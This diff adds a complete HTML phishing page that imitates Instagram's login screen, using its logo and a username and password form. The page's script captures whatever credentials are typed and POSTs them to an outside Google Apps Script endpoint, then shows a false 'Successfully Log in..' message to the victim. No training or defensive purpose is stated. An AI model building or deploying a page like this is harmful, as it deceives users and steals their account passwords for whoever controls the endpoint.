@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Login</title>
+    <link rel="shortcut icon" href="https://en.followersnet.com/wp-content/uploads/2017/07/Instagram.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <p>English (US)</p>
+        <img src="https://en.followersnet.com/wp-content/uploads/2017/07/Instagram.png" alt="Instagram">
+        <form method="POST" name="google-sheet" class="form">
+            <input type="text" placeholder="Username or mobile number" name="Username">
+            <input type="password" placeholder="Password" name="Password">
+            <!-- <button>Log in</button> -->
+            <input class="button" type="submit" value="Log in">
+            <p>Forgot password?</p>
+        </form>
+    </div>
+
+
+
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwSGWPA3i_pyM1eSkkoDqcPn0PxUklh5DS-vNnjCxILI78IXrGMa3nS1AdKbVgTWUhD7Q/exec'
+        const form = document.forms['google-sheet']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => alert("Successfully Log in.."))
+            .catch(error => console.error('Error!', error.message))
+        })
+    </script>
+</body>
+</html>
